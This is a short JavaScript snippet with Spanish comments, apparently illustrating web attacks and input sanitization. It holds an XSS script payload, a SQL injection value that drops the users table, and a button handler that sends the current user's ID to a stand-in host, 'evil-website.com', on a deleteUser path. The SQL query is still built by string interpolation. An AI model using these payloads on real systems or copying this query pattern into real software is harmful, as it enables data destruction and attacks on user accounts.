

const userInput = "<script>alert('¡Hola, soy un ataque XSS!');</script>";
const sanitizedInput = sanitizeHTML(userInput);
document.getElementById("mensaje").innerHTML = sanitizedInput;

const userId = getCurrentUserId(); // Obtener el ID del usuario actual
const maliciousURL = `https://evil-website.com/deleteUser?userId=${userId}`;
const deleteButton = document.getElementById("delete-button");
deleteButton.addEventListener("click", function() {
  sendDeleteRequest(maliciousURL);
});

const username = "admin'; DROP TABLE users;--";
const password = "password123";
const sanitizedUsername = sanitizeSQL(username);
const sanitizedPassword = sanitizeSQL(password);
const sqlQuery = `SELECT * FROM users WHERE username='${sanitizedUsername}' AND password='${sanitizedPassword}'`;
executeSQLQuery(sqlQuery);


